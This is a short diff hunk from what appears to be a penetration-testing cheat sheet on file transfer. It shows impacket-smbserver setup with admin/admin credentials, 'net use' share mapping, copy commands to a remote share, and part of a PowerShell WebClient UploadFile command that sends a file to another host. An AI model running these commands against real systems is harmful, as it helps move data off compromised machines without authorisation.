@@ -73,10 +73,11 @@ powershell.exe -c "(New-Object System.Net.WebClient).UploadFile('http://172.16.1
 
 
 impacket-smbserver share $(pwd) -smb2support
-impacket-smbserver share $(pwd) -smb2support -username admin -password admin 
+impacket-smbserver share $(pwd) -smb2support -username admin -password admin
+net use \\192.168.154.138\share /user:admin admin 
 		copy \\192.168.31.141\share\ignite.txt
 		 copy ignite.txt \\192.168.31.141\share\ignite.txt
-net use \\192.168.154.138\share /user:admin admin
+
 
 
 using tftp:
